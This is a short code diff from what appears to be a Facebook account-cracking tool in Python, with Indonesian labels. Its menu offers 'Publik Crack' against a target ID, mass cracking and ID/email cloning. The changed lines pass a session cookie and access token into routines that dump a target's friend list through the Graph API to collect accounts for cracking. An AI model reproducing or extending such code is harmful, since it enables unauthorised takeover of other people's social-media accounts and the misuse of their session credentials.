@@ -413,11 +413,11 @@ def login_menu():
              {H2}╰─▶ {B2}03 [bold purple]Clone ID Email  {H2}╰─▶ {B2}00 [bold purple]Exit Program""")
     ___Sllowly_ID____ = input(f'✶ ━━⫸ {H} Input{N} : ')
     if ___Sllowly_ID____ in ['1']:
-        massal2()
+        massal()
     elif ___Sllowly_ID____ in ['2']:
         print(nel(f'\t\t [bold blue]Publik Crack',width=90, padding=(0, 8), style=f"bold purple"))
         idt = input(f'\n✶ ━━⫸ {H2} Masukkan ID Target  : {m}')
-        dump1(idt,"",{"cookie":cookie},token)
+        dump(idt,"",{"cookie":cok},token)
         setting()
     elif ___Sllowly_ID____ in ['3']:
 	    mail2()
@@ -672,7 +672,7 @@ def massal2():
                 "https://graph.facebook.com/{}".format(user),
                 params=params,
                 headers=head,
-                cookies={"cookie": cookie},
+                cookies={"cookie": cok},
             ).json()
             for xr in url["friends"]["data"]:
                 try:
